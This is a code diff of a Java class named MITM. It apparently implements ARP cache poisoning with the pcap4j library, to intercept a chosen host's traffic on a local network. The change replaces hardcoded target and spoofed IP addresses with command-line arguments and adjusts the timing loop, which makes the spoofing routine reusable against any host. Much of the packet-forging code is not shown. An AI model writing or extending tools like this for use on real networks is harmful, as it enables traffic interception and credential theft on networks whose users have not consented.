@@ -1,24 +1,11 @@
 import org.pcap4j.core.*;
-import org.pcap4j.packet.ArpPacket;
-import org.pcap4j.packet.EthernetPacket;
 import org.pcap4j.packet.Packet;
-import org.pcap4j.packet.namednumber.ArpHardwareType;
 import org.pcap4j.packet.namednumber.ArpOperation;
-import org.pcap4j.packet.namednumber.EtherType;
-import org.pcap4j.util.ByteArrays;
 import org.pcap4j.util.MacAddress;
-import org.pcap4j.util.NifSelector;
 
-import java.io.BufferedReader;
 import java.io.IOException;
-import java.io.InputStreamReader;
-import java.net.Inet4Address;
 import java.net.InetAddress;
-import java.net.NetworkInterface;
 import java.net.UnknownHostException;
-import java.util.List;
-import java.util.concurrent.ExecutorService;
-import java.util.concurrent.Executors;
 
 public class MITM{
 
@@ -26,12 +13,21 @@ public class MITM{
 
     public static void main(String[] args) throws PcapNativeException, IOException, NotOpenException {
         //temporary fix to force pcap4j to use Npcap instead of wpcap
-        System.setProperty("jna.library.path", "C:/Windows/System32/Npcap/");
+        if(args.length > 3){
+            System.setProperty("jna.library.path", args[3]);
+        } else {
+            System.setProperty("jna.library.path", "C:/Windows/System32/Npcap/");
 
-        String targetIP = "192.168.0.118";
-        String spoofedIP = "192.168.0.104";
+        }
 
-        poisonArp(targetIP, spoofedIP, 30);
+        if(args.length < 3){
+            System.exit(2);
+        }
+        String targetIP = args[0];
+        String spoofedIP = args[1];
+        int timeInSeconds = Integer.parseInt(args[2]);
+
+        poisonArp(targetIP, spoofedIP, timeInSeconds);
 
     }
 
@@ -90,11 +86,11 @@ public class MITM{
             }
 
             try {
-                Thread.sleep(1000);
+                Thread.sleep(2000);
             } catch (InterruptedException e) {
                 e.printStackTrace();
             }
-            timeInSeconds++;
+            timer+=2;
         }
 
     }
@@ -120,8 +116,6 @@ public class MITM{
         } catch (NotOpenException e) {
             throw new RuntimeException(e);
         }
-
-        System.out.println("Arp sent");
         return true;
     }
 }
